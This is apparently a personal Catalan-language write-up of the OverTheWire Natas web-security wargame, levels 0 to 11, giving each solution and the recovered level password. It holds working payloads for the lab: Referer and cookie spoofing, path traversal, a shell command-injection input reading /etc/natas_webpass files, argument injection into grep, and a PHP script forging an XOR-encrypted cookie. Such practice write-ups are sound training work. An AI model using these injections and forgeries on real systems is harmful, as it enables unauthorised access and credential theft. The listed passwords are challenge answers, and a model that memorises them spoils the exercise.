# LEVEL 0

Inspeccionem l'element i podem veure un comentari en el div "content".

![Level0](img/level0.png)
```
g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
```

# LEVEL 1

Al estar bloquejat el click dret fiquem 
view-source:http://natas1.natas.labs.overthewire.org/
![Level1](img/level1.png)

```
h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
```

# LEVEL 2

Inspeccionem i veiem que carrega una imatge que té la ruta de /files. Accedim i veiem que en aquest directori hi ha un fitxer users.txt
![Level2](img/level2.png)

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

# LEVEL 3
En el codi no trobem res, mirem el robots.txt i viem que surt /s3cr3t/ entrem en aquest directori i trobem el fitxer users.txt amb la password.
![Level3](img/level3.png)

```
tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

# LEVEL 4

Modifiquem la petició amb el BurpSuite ja que ens diu que només accepta peticions del natas5, modifiquem el referer per http://natas5.natas.labs.overthewire.org/
![Level4](img/level4.png)

```
Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```


# LEVEL 5
Mirem la petició amb el BurpSuite, veiem que té un paràmetre que té el valor 0, li fiquem el valor 1 i ja podem entrar.
![Level5](img/level5.png)


```
Cookie: loggedin=0
```
```
fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

# LEVEL 6

Si cliquem a view source, podem veure un tros de codi php. On veiem un include includes/secret.inc, aquí dins hi ha una variable amb la contrasenya que hem de ficar a l'input per poder obtenir la contrasenya del Natas7.
Fallo: secret de forma gloabal

http://natas6.natas.labs.overthewire.org/includes/secret.inc

![Level6](img/level6.png)


```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

```
jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

# LEVEL 7

index.php?page= obre la pàgina, si mirem el codi veiem que el password està /etc/natas_webpass/natas8

Fallo: path traversal

![Level7](img/level7.png)

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

```
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
```
# LEVEL 8
Viem que en el codi PHP, fa un encode del $encodedSecret, ho descodifiquem i obtenim el valor que hem de ficar a l'input.


![Level8](img/level8.png)

```
<?php
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

function decode($secret){
	return base64_decode(strrev(hex2bin($secret)));
}

echo (decode("3d3d516343746d4d6d6c315669563362"));
```
```
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```
# LEVEL 9
Sabent que les contrasenyes es troben al directori /etc/natas_webpass/natasX i mirant el codi podem veure que es poden executar comandes des de l'input fem un cat del fitxer.

![Level9](img/level9.png)


```
;cat /etc/natas_webpass/natas10

```
```
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

# LEVEL 10
Com que ara en el codi amb expressions regulars no podem ficar ; en l'input fem un grep de la lletra A, per casualitat la password té el caràcter A i se'ns mostra.

![Level10](img/level10.png)


```
a /etc/natas_webpass/natas11
```
```
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

# LEVEL 11
Veiem que a la pàgina, les dades estan xifrades mitjançant XOR i emmagatzamades a la cookie, si aconseguim ficar el valor en YES ens mostrara la password. 

```
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```

decode coockie value base64
0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6

Cookie original amb valor NO:
**MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D**

Hem de modificar la cookie perquè tingui el valor YES.
```
<?php

$originalstring = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));

function xor_encrypt($in) {
    $key = 'KNHL';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo(base64_encode(xor_encrypt($originalstring))); 

?>
```
Cookie original amb valor YES:
**MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz**

Modifiquem la petició amb el BurpSuite per modificar el valor de la Cookie:

```
GET /?bgcolor=%23ffffff HTTP/1.1
Host: natas11.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMToxS0Zxb0pYaTZoUmFQbHVBbWs4RVNEVzRmU3lzUm9JZw==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas11.natas.labs.overthewire.org/?bgcolor=%23ffffff
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9
Cookie: data=MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
Connection: close
```

![Level11](img/level11.png)

Clau:
```
YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

```


